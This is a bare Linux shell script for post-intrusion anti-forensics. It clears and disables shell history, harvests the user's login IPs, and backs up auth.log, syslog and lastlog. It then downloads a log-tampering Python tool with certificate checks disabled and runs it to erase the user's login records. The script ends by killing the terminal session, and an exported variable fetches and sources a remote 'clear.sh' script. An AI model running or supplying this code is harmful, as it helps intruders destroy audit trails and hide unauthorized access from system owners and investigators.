
history -c 
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
export HISTFILE=/dev/null;
export HISTSIZE=0;
export HISTFILESIZE=0;

my_name="$(whoami)"
my_pts="$(who am i| awk '{print $2}' | xargs)"
my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;
index_f=/tmp/_fadsgindexfs;
flag="12412sdf"

function _bak {
  if [ -f $1 ];then
    cp -v $1 /tmp/  2>/dev/null 1>> $index_f
  fi
}

function _resume {
  eval $(cat $index_f | awk '{ print "cp -v ", $3, $1 }' )
}

echo "collection info for clear"
last | grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips
_bak /var/log/auth.log;
_bak /var/log/syslog;
_bak /var/log/lastlog;


function CL {
    wget --no-check-certificate  -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py'
    if [ -f logtamper.py ];then
	for ip_one in $(cat $my_ips);do
    	    python logtamper.py -m 2 -u $my_name -i $ip_one ;
        done
	rm logtamper.py
    fi
}



function Bye {
  CL
  _resume;
  pkill -9 $my_pts
}

export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; source clear.sh ; rm clear.sh"
